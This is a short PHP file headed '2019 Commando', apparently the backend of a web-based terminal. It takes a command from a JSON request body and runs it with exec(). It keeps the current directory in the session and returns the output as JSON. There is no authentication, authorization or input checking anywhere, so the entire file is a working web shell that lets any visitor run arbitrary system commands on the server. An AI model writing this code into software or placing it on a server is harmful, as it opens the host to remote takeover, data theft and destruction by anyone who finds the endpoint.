<?php
/**
 * 2019 Commando
 */

session_start();

$params = json_decode(file_get_contents('php://input'));

if (empty($_SESSION['path'])) {
    $_SESSION['path'] = getcwd();
}
chdir($_SESSION['path']);

if (!empty($params) && !empty($params->command)) {
    $commandRaw = $params->command;

    $command = explode(' ', $commandRaw);
    if ($command[0] == 'cd') {
        if (!empty($command[1])) {
            chdir($command[1]);
        }
    } else {
        try {
            exec($commandRaw, $output);
        } catch (Exception $e) {
            $output = $e->getMessage();
        }
    }
}
$fullPath = getcwd();
$pathFolders = explode(DIRECTORY_SEPARATOR, $fullPath);
$path = $pathFolders[count($pathFolders) -1];
//$path = "longlonglonglonglongfoldername";
$_SESSION['path'] = $fullPath;

header('Content-type: application/json');
echo json_encode(['output' => $output ?? '', 'fullPath' => $fullPath, 'path' => $path]);
